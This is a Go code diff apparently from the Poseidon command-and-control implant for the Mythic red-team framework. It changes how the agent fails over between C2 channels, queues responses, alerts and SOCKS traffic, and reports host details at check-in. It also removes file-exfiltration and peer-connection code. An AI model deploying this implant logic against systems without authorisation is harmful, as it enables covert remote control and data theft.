@@ -1,18 +1,10 @@
 package profiles
 
 import (
-	// Standard
-
-	"bytes"
-	"encoding/base64"
-	"encoding/binary"
 	"encoding/json"
 	"fmt"
-	"io"
-	"math"
+	"log"
 	"math/rand"
-	"net"
-	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
@@ -22,39 +14,432 @@ import (
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
-	"github.com/google/uuid"
 )
 
+// these are stamped in variables as part of build time
 var (
 	// UUID is a per-payload identifier assigned by Mythic during creation
-	UUID                  string
-	MythicID              = ""
-	SeededRand            = rand.New(rand.NewSource(time.Now().UnixNano()))
-	TaskResponses         []json.RawMessage
-	DelegateResponses     []structs.DelegateMessage
+	UUID string
+	// egress_order is a dictionary of c2 profiles and their intended connection orders
+	// this is input as a string from the compilation step, so we have to parse it out
+	egress_order string
+	// egress_failover is the method of determining how/when to swap to another c2 profile
+	egress_failover string
+	// debugString
+	debugString string
+	// failoverThresholdString
+	failedConnectionCountThresholdString string
+)
+
+// these are internal representations and other variables
+var (
+
+	// debug
+	debug bool
+	// currentConnectionID is which fallback profile we're currently running
+	currentConnectionID    = 0
+	failedConnectionCounts map[string]int
+	// failedConnectionCountThreshold is how many failed attempts before rotating
+	failedConnectionCountThreshold = 10
+	// egressOrder the priority for starting and running egress profiles
+	egressOrder map[string]int
+	// MythicID is the callback UUID once this payload finishes staging
+	MythicID = ""
+	// SeededRand is used when generating a random value for EKE
+	SeededRand = rand.New(rand.NewSource(time.Now().UnixNano()))
+	// TaskResponses is an array of responses for Mythic
+	TaskResponses []structs.Response
+	// TaskInteractiveResponses is an array of interactive messages for Mythic
+	TaskInteractiveResponses []structs.InteractiveTaskMessage
+	// DelegateResponses is an array of messages from delegates to go to Mythic
+	DelegateResponses []structs.DelegateMessage
+	// P2PConnectionMessages is an array of P2P add/remove messages for Mythic
 	P2PConnectionMessages []structs.P2PConnectionMessage
+	// AlertResponses is an array of alert notifications for the operator
+	AlertResponses []structs.Alert
 	// channel to process normal messages from P2P connection
 	HandleInboundMythicMessageFromEgressP2PChannel = make(chan structs.MythicMessageResponse, 10)
-	HandleMythicMessageToEgressFromP2PChannel      = make(chan bool)
-	// channels to add/remove TCP connections connection
-	AddNewInternalTCPConnectionChannel = make(chan net.Conn, 1)
-	RemoveInternalTCPConnectionChannel = make(chan string, 1)
-	InternalTCPConnections             = make(map[string]net.Conn)
-	UUIDMappings                       = make(map[string]string)
-	mu                                 sync.Mutex
+
+	mu sync.Mutex
 	// process SOCKSv5 Messages from Mythic
 	FromMythicSocksChannel = make(chan structs.SocksMsg, 100)
 	FromMythicRpfwdChannel = make(chan structs.SocksMsg, 100)
 	// send SOCKSv5 Messages to Mythic
-	ToMythicSocksChannel = make(chan structs.SocksMsg, 100)
-	ToMythicRpfwdChannel = make(chan structs.SocksMsg, 100)
+	InterceptToMythicSocksChannel = make(chan structs.SocksMsg, 100)
+	toMythicSocksChannel          = make(chan structs.SocksMsg, 100)
+	InterceptToMythicRpfwdChannel = make(chan structs.SocksMsg, 100)
+	toMythicRpfwdChannel          = make(chan structs.SocksMsg, 100)
+	// interactive tasks channel
+	NewInteractiveTaskOutputChannel = make(chan structs.InteractiveTaskMessage, 100)
+	NewAlertChannel                 = make(chan structs.Alert, 10)
+	// channel processes responses that should go out and directs them towards the egress direction
+	NewResponseChannel          = make(chan structs.Response, 10)
+	NewDelegatesToMythicChannel = make(chan structs.DelegateMessage, 10)
+	P2PConnectionMessageChannel = make(chan structs.P2PConnectionMessage, 10)
+
+	availableC2Profiles      = make(map[string]structs.Profile)
+	availableC2ProfilesMutex sync.RWMutex
 )
 
+func AddAvailableProfile(newProfile structs.Profile) {
+	availableC2ProfilesMutex.Lock()
+	defer availableC2ProfilesMutex.Unlock()
+	availableC2Profiles[newProfile.ProfileName()] = newProfile
+}
+
+// gather the delegate messages that need to go out the egress channel into a central location
+func aggregateDelegateMessagesToMythic() {
+	for {
+		response := <-NewDelegatesToMythicChannel
+		pushChan := GetPushChannel()
+		if pushChan != nil {
+			pushChan <- structs.MythicMessage{
+				Action:    "post_response",
+				Delegates: &[]structs.DelegateMessage{response},
+			}
+		} else {
+			mu.Lock()
+			DelegateResponses = append(DelegateResponses, response)
+			mu.Unlock()
+		}
+	}
+}
+
+// gather the edge notifications that need to go out the egress channel
+func aggregateEdgeAnnouncementsToMythic() {
+	for {
+		response := <-P2PConnectionMessageChannel
+		pushChan := GetPushChannel()
+		if pushChan != nil {
+			pushChan <- structs.MythicMessage{
+				Action: "post_response",
+				Edges:  &[]structs.P2PConnectionMessage{response},
+			}
+		} else {
+			mu.Lock()
+			P2PConnectionMessages = append(P2PConnectionMessages, response)
+			mu.Unlock()
+		}
+	}
+}
+
+// gather the responses from the task go routines into a central location
+func aggregateResponses(removeRunningTasksChannel chan string) {
+	for {
+		select {
+		case response := <-NewResponseChannel:
+			if response.Completed {
+				// We need to remove this job from our list of jobs
+				go func() {
+					removeRunningTasksChannel <- response.TaskID
+				}()
+			}
+			pushChan := GetPushChannel()
+			if pushChan != nil {
+				pushChan <- structs.MythicMessage{
+					Action:    "post_response",
+					Responses: &[]structs.Response{response},
+				}
+			} else {
+				mu.Lock()
+				TaskResponses = append(TaskResponses, response)
+				mu.Unlock()
+			}
+		case response := <-NewInteractiveTaskOutputChannel:
+			pushChan := GetPushChannel()
+			if pushChan != nil {
+				pushChan <- structs.MythicMessage{
+					Action:           "post_response",
+					InteractiveTasks: &[]structs.InteractiveTaskMessage{response},
+				}
+			} else {
+				mu.Lock()
+				TaskInteractiveResponses = append(TaskInteractiveResponses, response)
+				mu.Unlock()
+			}
+		case response := <-NewAlertChannel:
+			pushChan := GetPushChannel()
+			if pushChan != nil {
+				PrintDebug("adding new alert to pushChan")
+				pushChan <- structs.MythicMessage{
+					Action: "post_response",
+					Alerts: &[]structs.Alert{response},
+				}
+			} else {
+				PrintDebug("adding new alert to alert responses")
+				mu.Lock()
+				AlertResponses = append(AlertResponses, response)
+				mu.Unlock()
+			}
+		}
+	}
+}
+
+func aggregateSocksTrafficToMythic() {
+	for {
+		response := <-InterceptToMythicSocksChannel
+		pushChan := GetPushChannel()
+		if pushChan != nil {
+			pushChan <- structs.MythicMessage{
+				Action: "post_response",
+				Socks:  &[]structs.SocksMsg{response},
+			}
+		} else {
+			// if there's no push channel, forward it along like normal for somebody else to get it
+			toMythicSocksChannel <- response
+		}
+	}
+}
+func aggregateRpfwdTrafficToMythic() {
+	for {
+		response := <-InterceptToMythicRpfwdChannel
+		pushChan := GetPushChannel()
+		if pushChan != nil {
+			pushChan <- structs.MythicMessage{
+				Action: "post_response",
+				Rpfwds: &[]structs.SocksMsg{response},
+			}
+		} else {
+			// if there's no push channel, forward it along like normal for somebody else to get it
+			toMythicRpfwdChannel <- response
+		}
+	}
+}
+
+func Initialize(removeRunningTasksChannel chan string) {
+	go aggregateDelegateMessagesToMythic()
+	go aggregateEdgeAnnouncementsToMythic()
+	go aggregateResponses(removeRunningTasksChannel)
+	go aggregateSocksTrafficToMythic()
+	go aggregateRpfwdTrafficToMythic()
+	if debugString == "" || strings.ToLower(debugString) == "false" {
+		debug = false
+	} else {
+		debug = true
+	}
+}
+func PrintDebug(msg string) {
+	if debug {
+		log.Print(msg)
+	}
+}
+func Start() {
+	parsedConnectionOrder := make(map[string]string)
+	egressOrder = make(map[string]int)
+	err := json.Unmarshal([]byte(egress_order), &parsedConnectionOrder)
+	if err != nil {
+		log.Fatalf("Failed to parse connection orders: %v", err)
+	}
+	failedConnectionCounts = make(map[string]int)
+	for key, _ := range parsedConnectionOrder {
+		egressOrder[key], err = strconv.Atoi(parsedConnectionOrder[key])
+		if err != nil {
+			log.Fatalf("Failed to parse connection order value: %v", err)
+		}
+		failedConnectionCounts[key] = 0
+	}
+	failedConnectionCountThreshold, err = strconv.Atoi(failedConnectionCountThresholdString)
+	if err != nil {
+		PrintDebug(fmt.Sprintf("Setting failedConnectionCountThreshold to 10: %v", err))
+		failedConnectionCountThreshold = 10
+	}
+	// start one egress
+	availableC2ProfilesMutex.RLock()
+	for egressC2, val := range egressOrder {
+		if val == currentConnectionID {
+			foundCurrentConnection := false
+			for availableC2, _ := range availableC2Profiles {
+				if !availableC2Profiles[availableC2].IsP2P() && availableC2 == egressC2 {
+					PrintDebug(fmt.Sprintf("starting: %s\n", availableC2))
+					go availableC2Profiles[availableC2].Start()
+					foundCurrentConnection = true
+					break
+				}
+			}
+			if foundCurrentConnection {
+				break
+			} else {
+				currentConnectionID = currentConnectionID + 1
+				if currentConnectionID > len(availableC2Profiles) {
+					//log.Fatal("Failed to find available c2, exiting")
+					break
+				}
+			}
+		}
+	}
+
+	// start p2p
+	for c2, _ := range availableC2Profiles {
+		if availableC2Profiles[c2].IsP2P() {
+			PrintDebug(fmt.Sprintf("starting: %s\n", c2))
+			go availableC2Profiles[c2].Start()
+		}
+	}
+	availableC2ProfilesMutex.RUnlock()
+	// wait forever
+	forever := make(chan bool, 1)
+	<-forever
+}
+func IncrementFailedConnection(c2Name string) {
+	failedConnectionCounts[c2Name] += 1
+	if failedConnectionCounts[c2Name] > failedConnectionCountThreshold {
+		go StartNextEgress(c2Name)
+		failedConnectionCounts[c2Name] = 0
+	}
+}
+
+// StartNextEgress automatically called when failed connection count >= threshold
+func StartNextEgress(failedConnectionC2Profile string) {
+	// first stop the current egress
+	PrintDebug("Looping to start next egress protocol")
+	for key, _ := range egressOrder {
+		if key == failedConnectionC2Profile {
+			for c2, _ := range availableC2Profiles {
+				if !availableC2Profiles[c2].IsP2P() && c2 == key {
+					PrintDebug(fmt.Sprintf("stopping: %s\n", c2))
+					failedConnectionCounts[c2] = 0
+					availableC2Profiles[c2].Stop()
+					break
+				}
+			}
+		}
+	}
+	egressC2StillRunning := false
+	for c2, _ := range availableC2Profiles {
+		if !availableC2Profiles[c2].IsP2P() && availableC2Profiles[c2].IsRunning() {
+			egressC2StillRunning = true
+		}
+	}
+	startedC2 := ""
+	if !egressC2StillRunning {
+		PrintDebug(fmt.Sprintf("No more egress c2 profiles running, start the next\n"))
+		// update the connectionID and wrap around if necessary
+		if egress_failover == "round-robin" {
+			currentConnectionID = (currentConnectionID + 1) % len(egressOrder)
+		}
+		// start the next egress
+		for key, val := range egressOrder {
+			if val == currentConnectionID {
+				for c2, _ := range availableC2Profiles {
+					if !availableC2Profiles[c2].IsP2P() && c2 == key {
+						PrintDebug(fmt.Sprintf("starting: %s\n", c2))
+						startedC2 = c2
+						failedConnectionCounts[c2] = 0
+						go availableC2Profiles[c2].Start()
+						break
+					}
+				}
+			}
+		}
+	}
+	if GetMythicID() != "" && startedC2 != "" && startedC2 != failedConnectionC2Profile {
+		// we started a new c2 profile other than the one that just hit the failure count
+		// send off a message to Mythic that the other connection channel is dead
+		P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
+			Source:        GetMythicID(),
+			Destination:   GetMythicID(),
+			Action:        "remove",
+			C2ProfileName: failedConnectionC2Profile,
+		}
+		source := fmt.Sprintf("poseidon: %s", GetMythicID())
+		level := structs.AlertLevelInfo
+		PrintDebug("adding alert to NewAlertChannel")
+		NewAlertChannel <- structs.Alert{
+			Alert:  fmt.Sprintf("Poseidon, %s, Stopped C2 Profile '%s' and started '%s'", GetMythicID(), failedConnectionC2Profile, startedC2),
+			Source: &source,
+			Level:  &level,
+		}
+	}
+}
+
+// GetAllC2Info collects metadata about all compiled in c2 profiles
+func GetAllC2Info() string {
+	output := ""
+	for c2, _ := range availableC2Profiles {
+		output += availableC2Profiles[c2].ProfileName() + ":\n"
+		output += availableC2Profiles[c2].GetConfig() + "\n"
+	}
+	return output
+}
+
+// SetAllEncryptionKeys makes sure all compiled c2 profiles are updated with callback encryption information
+func SetAllEncryptionKeys(newKey string) {
+	for c2, _ := range availableC2Profiles {
+		availableC2Profiles[c2].SetEncryptionKey(newKey)
+	}
+}
+
+// StartC2Profile starts a specific c2 profile by name (usually via tasking)
+func StartC2Profile(profileName string) {
+	for c2, _ := range availableC2Profiles {
+		if c2 == profileName {
+			PrintDebug(fmt.Sprintf("Starting C2 profile by name from tasking: %s\n", profileName))
+			go availableC2Profiles[c2].Start()
+		}
+	}
+}
+
+// StopC2Profile stops a specific c2 profile by name (usually via tasking)
+func StopC2Profile(profileName string) {
+	PrintDebug(fmt.Sprintf("Stopping C2 profile by name from tasking: %s\n", profileName))
+	StartNextEgress(profileName)
+}
+
+// UpdateAllSleepInterval updates sleep interval for all compiled c2 profiles
+func UpdateAllSleepInterval(newInterval int) string {
+	output := ""
+	for c2, _ := range availableC2Profiles {
+		output += fmt.Sprintf("[%s] - %s", c2, availableC2Profiles[c2].SetSleepInterval(newInterval))
+	}
+	return output
+}
+
+// UpdateAllSleepJitter updates sleep jitter for all compiled c2 profiles
+func UpdateAllSleepJitter(newJitter int) string {
+	output := ""
+	for c2, _ := range availableC2Profiles {
+		output += fmt.Sprintf("[%s] - %s", c2, availableC2Profiles[c2].SetSleepJitter(newJitter))
+	}
+	return output
+}
+
+// UpdateC2Profile updates an arbitrary parameter/value for the specified c2 profile
+func UpdateC2Profile(profileName string, argName string, argValue string) {
+	for c2, _ := range availableC2Profiles {
+		if c2 == profileName {
+			availableC2Profiles[c2].UpdateConfig(argName, argValue)
+		}
+	}
+}
+
+// GetPushChannel gets the channel for the currently running c2 profile if one exists
+func GetPushChannel() chan structs.MythicMessage {
+	for c2, _ := range availableC2Profiles {
+		if availableC2Profiles[c2].GetPushChannel() != nil {
+			return availableC2Profiles[c2].GetPushChannel()
+		}
+	}
+	return nil
+}
+
+// GetSleepTime gets the sleep time for the currently running c2 profile
+func GetSleepTime() int {
+	for c2, _ := range availableC2Profiles {
+		sleep := availableC2Profiles[c2].GetSleepTime()
+		if sleep >= 0 {
+			return sleep
+		}
+	}
+	return 0
+}
+
+// GetMythicID returns the current Mythic UUID
 func GetMythicID() string {
 	return MythicID
 }
 
 func SetMythicID(newMythicID string) {
+	PrintDebug(fmt.Sprintf("Updating MythicID: %s -> %s\n", MythicID, newMythicID))
 	MythicID = newMythicID
 }
 
@@ -67,7 +452,7 @@ func GenerateSessionID() string {
 	return string(b)
 }
 
-func getSocksChannelData(toMythicSocksChannel chan structs.SocksMsg) []structs.SocksMsg {
+func getSocksChannelData() []structs.SocksMsg {
 	var data = make([]structs.SocksMsg, 0)
 	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
 	for {
@@ -86,7 +471,7 @@ func getSocksChannelData(toMythicSocksChannel chan structs.SocksMsg) []structs.S
 		}
 	}
 }
-func getRpfwdChannelData(toMythicRpfwdChannel chan structs.SocksMsg) []structs.SocksMsg {
+func getRpfwdChannelData() []structs.SocksMsg {
 	var data = make([]structs.SocksMsg, 0)
 	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
 	for {
@@ -106,25 +491,32 @@ func getRpfwdChannelData(toMythicRpfwdChannel chan structs.SocksMsg) []structs.S
 	}
 }
 
-// gather profiles.TaskResponses, profiles.DelegateResponses, and getSocksChannelData into a post_response message
-func CreateMythicMessage() *structs.MythicMessage {
+func CreateMythicPollMessage() *structs.MythicMessage {
 	responseMsg := structs.MythicMessage{}
 	responseMsg.Action = "get_tasking"
 	responseMsg.TaskingSize = -1
 	responseMsg.GetDelegateTasks = true
-	SocksArray := getSocksChannelData(ToMythicSocksChannel)
-	RpfwdArray := getRpfwdChannelData(ToMythicRpfwdChannel)
-	if len(TaskResponses) > 0 || len(DelegateResponses) > 0 || len(P2PConnectionMessages) > 0 {
-		ResponseArray := make([]json.RawMessage, 0)
+	SocksArray := getSocksChannelData()
+	RpfwdArray := getRpfwdChannelData()
+	if len(TaskResponses) > 0 || len(DelegateResponses) > 0 ||
+		len(P2PConnectionMessages) > 0 || len(TaskInteractiveResponses) > 0 ||
+		len(AlertResponses) > 0 {
+		ResponseArray := make([]structs.Response, 0)
 		DelegateArray := make([]structs.DelegateMessage, 0)
 		P2PConnectionsArray := make([]structs.P2PConnectionMessage, 0)
+		InteractiveTaskResponsesArray := make([]structs.InteractiveTaskMessage, 0)
+		AlertsArray := make([]structs.Alert, 0)
 		mu.Lock()
 		ResponseArray = append(ResponseArray, TaskResponses...)
 		DelegateArray = append(DelegateArray, DelegateResponses...)
 		P2PConnectionsArray = append(P2PConnectionsArray, P2PConnectionMessages...)
-		TaskResponses = make([]json.RawMessage, 0)
+		InteractiveTaskResponsesArray = append(InteractiveTaskResponsesArray, TaskInteractiveResponses...)
+		AlertsArray = append(AlertsArray, AlertResponses...)
+		TaskResponses = make([]structs.Response, 0)
 		DelegateResponses = make([]structs.DelegateMessage, 0)
 		P2PConnectionMessages = make([]structs.P2PConnectionMessage, 0)
+		TaskInteractiveResponses = make([]structs.InteractiveTaskMessage, 0)
+		AlertResponses = make([]structs.Alert, 0)
 		mu.Unlock()
 		if len(ResponseArray) > 0 {
 			responseMsg.Responses = &ResponseArray
@@ -135,10 +527,17 @@ func CreateMythicMessage() *structs.MythicMessage {
 		if len(P2PConnectionsArray) > 0 {
 			responseMsg.Edges = &P2PConnectionsArray
 		}
+		if len(InteractiveTaskResponsesArray) > 0 {
+			responseMsg.InteractiveTasks = &InteractiveTaskResponsesArray
+		}
+
+		if len(AlertsArray) > 0 {
+			PrintDebug("adding alert to poll message")
+			responseMsg.Alerts = &AlertsArray
+		}
 	}
 	if len(SocksArray) > 0 {
 		responseMsg.Socks = &SocksArray
-		//fmt.Printf("sending socks data back to Mythic\n")
 	}
 	if len(RpfwdArray) > 0 {
 		responseMsg.Rpfwds = &RpfwdArray
@@ -146,7 +545,7 @@ func CreateMythicMessage() *structs.MythicMessage {
 	return &responseMsg
 }
 
-func CreateCheckinMessage() interface{} {
+func CreateCheckinMessage() structs.CheckInMessage {
 	currentUser := functions.GetUser()
 	hostname := functions.GetHostname()
 	currIP := functions.GetCurrentIPAddress()
@@ -174,357 +573,4 @@ func CreateCheckinMessage() interface{} {
 		checkin.IntegrityLevel = 2
 	}
 	return checkin
-}
-
-func SendTCPData(sendData []byte, conn net.Conn) error {
-	err := binary.Write(conn, binary.BigEndian, int32(len(sendData)))
-	if err != nil {
-		//fmt.Printf("Failed to send down pipe with error: %v\n", err)
-		return err
-	}
-	_, err = conn.Write(sendData)
-	if err != nil {
-		//fmt.Printf("Failed to send with error: %v\n", err)
-		return err
-	}
-	//fmt.Printf("Sent %d bytes to connection\n", totalWritten)
-	return nil
-}
-func GetInternalConnectionUUID(oldUUID string) string {
-	if newUUID, ok := UUIDMappings[oldUUID]; ok {
-		return newUUID
-	}
-	return oldUUID
-}
-func CheckIfNewInternalTCPConnection(newConnectionString string) bool {
-	// check to see if newInternalChannel.RemoteAddr().String() exists already
-	//fmt.Printf("Checking if connection string is new: %s\n", newConnectionString)
-	//printInternalTCPConnectionMap()
-	for _, v := range InternalTCPConnections {
-		if v.RemoteAddr().String() == newConnectionString {
-			return false
-		}
-	}
-	return true
-}
-func AddNewInternalTCPConnection(newInternalChannel net.Conn) string {
-	connectionUUID := uuid.New().String()
-	//fmt.Printf("AddNewInternalConnectionChannel with UUID ( %s ) for %v\n", connectionUUID, newInternalChannel)
-	InternalTCPConnections[connectionUUID] = newInternalChannel
-	return connectionUUID
-}
-func RemoveInternalTCPConnection(connectionUUID string) bool {
-	if conn, ok := InternalTCPConnections[connectionUUID]; ok {
-		//fmt.Printf("about to remove a connection, %s\n", connectionUUID)
-		//printInternalTCPConnectionMap()
-		conn.Close()
-		delete(InternalTCPConnections, connectionUUID)
-		//fmt.Printf("connection removed, %s\n", connectionUUID)
-		//printInternalTCPConnectionMap()
-		return true
-	} else {
-		// we don't know about this connection we're asked to close
-		return false
-	}
-}
-func HandleDelegateMessageForInternalTCPConnections(delegates []structs.DelegateMessage) {
-	for i := 0; i < len(delegates); i++ {
-		//fmt.Printf("HTTP's HandleInternalDelegateMessages going to linked node: %v\n", delegates[i])
-		// check to see if this message goes to something we know about
-		if conn, ok := InternalTCPConnections[delegates[i].UUID]; ok {
-			if delegates[i].MythicUUID != "" {
-				// Mythic told us that our UUID was fake and gave the right one
-				InternalTCPConnections[delegates[i].MythicUUID] = conn
-				// remove our old one
-				delete(InternalTCPConnections, delegates[i].UUID)
-				UUIDMappings[delegates[i].UUID] = delegates[i].MythicUUID
-			}
-			//fmt.Printf("HTTP's sending data: ")
-			err := SendTCPData([]byte(delegates[i].Message), conn)
-			if err != nil {
-				//fmt.Printf("Failed to send data, should adjust connection information based on error: %v\n", err)
-
-			}
-		}
-	}
-}
-func printInternalTCPConnectionMap() {
-	fmt.Printf("----- InternalTCPConnectionsMap ------\n")
-	for k, v := range InternalTCPConnections {
-		fmt.Printf("ID: %s, Connection: %s\n", k, v.RemoteAddr().String())
-	}
-	fmt.Printf("---- done -----\n")
-}
-
-// SendFileChunks - Helper function to deal with sending files from agent to Mythic
-func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
-	var size int64
-	if sendFileToMythic.Data == nil {
-		if sendFileToMythic.File == nil {
-			errResponse := structs.Response{}
-			errResponse.Completed = true
-			errResponse.TaskID = sendFileToMythic.Task.TaskID
-			errResponse.UserOutput = fmt.Sprintf("No data and no file specified when trying to send a file to Mythic")
-			sendFileToMythic.Task.Job.SendResponses <- errResponse
-			sendFileToMythic.FinishedTransfer <- 1
-			return
-		} else {
-			fi, err := sendFileToMythic.File.Stat()
-			if err != nil {
-				errResponse := structs.Response{}
-				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
-				return
-			}
-			size = fi.Size()
-		}
-	} else {
-		size = int64(len(*sendFileToMythic.Data))
-	}
-
-	const FILE_CHUNK_SIZE = 512000 //Normal mythic chunk size
-	chunks := uint64(math.Ceil(float64(size) / FILE_CHUNK_SIZE))
-	fileDownloadData := structs.FileDownloadMessage{}
-	fileDownloadData.TotalChunks = int(chunks)
-	fileDownloadData.FullPath = sendFileToMythic.FullPath
-	if sendFileToMythic.FullPath != "" {
-		abspath, err := filepath.Abs(sendFileToMythic.FullPath)
-		if err != nil {
-			errResponse := structs.Response{}
-			errResponse.Completed = true
-			errResponse.TaskID = sendFileToMythic.Task.TaskID
-			errResponse.UserOutput = fmt.Sprintf("Error getting full path to file: %s", err.Error())
-			sendFileToMythic.Task.Job.SendResponses <- errResponse
-			sendFileToMythic.FinishedTransfer <- 1
-			return
-		}
-		fileDownloadData.FullPath = abspath
-	}
-	fileDownloadData.IsScreenshot = sendFileToMythic.IsScreenshot
-	fileDownloadData.FileName = sendFileToMythic.FileName
-	// create our normal response message and add our Download part to it
-	fileDownloadMsg := structs.Response{}
-	fileDownloadMsg.TaskID = sendFileToMythic.Task.TaskID
-	fileDownloadMsg.Download = &fileDownloadData
-	fileDownloadMsg.TrackingUUID = sendFileToMythic.TrackingUUID
-	// send the initial message to Mythic to announce we have a file to transfer
-	sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg
-
-	var fileDetails map[string]interface{}
-
-	for {
-		// Wait for a response from the channel
-		resp := <-sendFileToMythic.FileTransferResponse
-		err := json.Unmarshal(resp, &fileDetails)
-		//fmt.Printf("Got %v back from file download first response", fileDetails)
-		if err != nil {
-			errResponse := structs.Response{}
-			errResponse.Completed = true
-			errResponse.TaskID = sendFileToMythic.Task.TaskID
-			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
-			sendFileToMythic.Task.Job.SendResponses <- errResponse
-			sendFileToMythic.FinishedTransfer <- 1
-			return
-		}
-
-		//log.Printf("Receive file download registration response %s\n", resp)
-		if _, ok := fileDetails["file_id"]; ok {
-			if ok {
-				updateUserOutput := structs.Response{}
-				updateUserOutput.TaskID = sendFileToMythic.Task.TaskID
-				updateUserOutput.UserOutput = "{\"file_id\": \"" + fmt.Sprintf("%v", fileDetails["file_id"]) + "\", \"total_chunks\": \"" + strconv.Itoa(int(chunks)) + "\"}\n"
-				sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
-				break
-			} else {
-				//log.Println("Didn't find response with file_id key")
-				continue
-			}
-		}
-	}
-	var r *bytes.Buffer = nil
-	if sendFileToMythic.Data != nil {
-		r = bytes.NewBuffer(*sendFileToMythic.Data)
-	} else {
-		sendFileToMythic.File.Seek(0, 0)
-	}
-	lastPercentCompleteNotified := 0
-	for i := uint64(0); i < chunks; {
-		if sendFileToMythic.Task.ShouldStop() {
-			// tasked to stop, so bail
-			sendFileToMythic.FinishedTransfer <- 1
-			return
-		}
-		time.Sleep(time.Duration(sendFileToMythic.Task.Job.C2.GetSleepTime()) * time.Second)
-		partSize := int(math.Min(FILE_CHUNK_SIZE, float64(int64(size)-int64(i*FILE_CHUNK_SIZE))))
-		partBuffer := make([]byte, partSize)
-		// Create a temporary buffer and read a chunk into that buffer from the file
-		if sendFileToMythic.Data != nil {
-			_, err := r.Read(partBuffer)
-			if err != io.EOF && err != nil {
-				errResponse := structs.Response{}
-				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("\nError reading from file: %s\n", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
-				return
-			}
-		} else {
-			// Skipping i*FILE_CHUNK_SIZE bytes from the begging of the file, os.SeekStart, 0
-			sendFileToMythic.File.Seek(int64(i*FILE_CHUNK_SIZE), 0)
-			_, err := sendFileToMythic.File.Read(partBuffer)
-			if err != io.EOF && err != nil {
-				errResponse := structs.Response{}
-				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("\nError reading from file: %s\n", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
-				return
-			}
-		}
-
-		fileDownloadData := structs.FileDownloadMessage{}
-		fileDownloadData.ChunkNum = int(i) + 1
-		//fileDownloadData.TotalChunks = -1
-		fileDownloadData.FileID = fileDetails["file_id"].(string)
-		fileDownloadData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
-		fileDownloadMsg.Download = &fileDownloadData
-		sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg
-		newPercentComplete := ((fileDownloadData.ChunkNum * 100) / int(chunks))
-		if newPercentComplete/10 > lastPercentCompleteNotified && sendFileToMythic.SendUserStatusUpdates {
-			response := structs.Response{}
-			response.Completed = false
-			response.TaskID = sendFileToMythic.Task.TaskID
-			response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
-			sendFileToMythic.Task.Job.SendResponses <- response
-			lastPercentCompleteNotified = newPercentComplete / 10
-		}
-		// Wait for a response for our file chunk
-		var postResp map[string]interface{}
-		for {
-			decResp := <-sendFileToMythic.FileTransferResponse
-			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk
-
-			if err != nil {
-				errResponse := structs.Response{}
-				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
-				return
-			}
-			break
-		}
-
-		if strings.Contains(postResp["status"].(string), "success") {
-			// only go to the next chunk if this one was successful
-			i++
-		}
-
-	}
-	sendFileToMythic.FinishedTransfer <- 1
-	return
-}
-
-// Get a file
-func GetFile(getFileFromMythic structs.GetFileFromMythicStruct) {
-	// when we're done fetching the file, send a 0 byte length byte array to the getFileFromMythic.ReceivedChunkChannel
-	fileUploadData := structs.FileUploadMessage{}
-	fileUploadData.FileID = getFileFromMythic.FileID
-	fileUploadData.ChunkSize = 512000
-	fileUploadData.ChunkNum = 1
-	fileUploadData.FullPath = getFileFromMythic.FullPath
-
-	fileUploadMsg := structs.Response{}
-	fileUploadMsg.TaskID = getFileFromMythic.Task.TaskID
-	fileUploadMsg.Upload = &fileUploadData
-	fileUploadMsg.TrackingUUID = getFileFromMythic.TrackingUUID
-
-	getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
-	rawData := <-getFileFromMythic.FileTransferResponse
-	fileUploadMsgResponse := structs.FileUploadMessageResponse{} // Unmarshal the file upload response from mythic
-	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
-	if err != nil {
-		errResponse := structs.Response{}
-		errResponse.Completed = true
-		errResponse.TaskID = getFileFromMythic.Task.TaskID
-		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
-		getFileFromMythic.Task.Job.SendResponses <- errResponse
-		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
-		return
-	}
-	// inform the user that we started getting data and let them know how many chunks it'll be
-	if getFileFromMythic.SendUserStatusUpdates {
-		response := structs.Response{}
-		response.Completed = false
-		response.TaskID = getFileFromMythic.Task.TaskID
-		response.UserOutput = fmt.Sprintf("Fetching file from Mythic with %d total chunks at %d bytes per chunk\n", fileUploadMsgResponse.TotalChunks, fileUploadData.ChunkSize)
-		getFileFromMythic.Task.Job.SendResponses <- response
-	}
-	// start handling the data and sending it to the requesting task
-	decoded, err := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
-	if err != nil {
-		errResponse := structs.Response{}
-		errResponse.Completed = true
-		errResponse.TaskID = getFileFromMythic.Task.TaskID
-		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
-		getFileFromMythic.Task.Job.SendResponses <- errResponse
